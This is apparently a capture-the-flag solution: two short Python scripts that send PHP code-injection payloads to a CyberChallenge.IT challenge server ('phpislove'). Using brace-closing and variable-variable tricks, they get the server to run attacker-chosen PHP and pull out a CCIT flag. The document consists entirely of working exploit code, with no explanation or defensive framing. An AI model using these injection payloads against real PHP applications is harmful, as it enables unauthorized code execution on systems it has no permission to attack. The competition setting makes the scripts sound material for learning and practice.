import requests

URL = 'http://phpislove.challs.cyberchallenge.it/?a=print_r'

r = requests.post(URL, data={'code':'};${$variables{0}}{a}(${$strings{4}});?>'})

print(r.content.decode())


import requests

url = 'http://phpislove.challs.cyberchallenge.it/'
data = {
    'code' : '}print(${$strings{4}});#'
    }
r = requests.post(url, data=data)
print(r.text[r.text.find('CCIT{') : r.text.find('}') + 1])

